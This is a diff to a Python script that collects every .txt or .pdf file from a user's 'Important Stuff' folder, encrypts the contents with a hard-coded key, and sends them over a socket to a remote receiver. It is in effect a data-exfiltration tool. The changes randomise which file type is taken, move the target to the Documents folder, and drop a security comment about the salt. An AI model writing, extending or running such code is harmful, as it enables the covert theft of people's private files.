@@ -3,6 +3,7 @@ import socket
 #from crypto.Cipher import AES
 import base64
 import os
+import random
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
@@ -10,7 +11,7 @@ from cryptography.fernet import Fernet
 
 password_provided = "Covid19" # This is input in the form of a string
 password = password_provided.encode() # Convert to type bytes
-salt = b'Bwahaha' # CHANGE THIS - recommend using a key from os.urandom(16), must be of type bytes
+salt = b'Bwahaha'
 kdf = PBKDF2HMAC(
     algorithm=hashes.SHA256(),
     length=32,
@@ -30,12 +31,18 @@ socket_sender.connect(receiver_info)
 
 
 pwd = os.getcwd()
-os.chdir("C:\\Users\\Jarrett\\Desktop")  # example
-files = os.listdir("C:\\Users\\Jarrett\\Desktop")
+os.chdir("C:\\Users\\Jarrett\\Documents\Important Stuff")  # example
+files = os.listdir("C:\\Users\\Jarrett\\Documents\\Important Stuff")
+
+generator = int(random.uniform(0,1)*100)
+if generator%2==0:
+    extension = ".txt"
+else:
+    extension = ".pdf"
 
 content = b''
 for file in files:
-    if file.endswith(".txt"):
+    if file.endswith(extension):
         #print(file)
         
         # Open file, add relevant begin and filename markers between data
@@ -53,7 +60,6 @@ f = Fernet(key)
 encrypted = f.encrypt(content)
 #obj = AES.new('Covid19', AES.MODE_CBC)
 #ciphertext = obj.encrypt(content)
-
 
 socket_sender.send(encrypted)
 
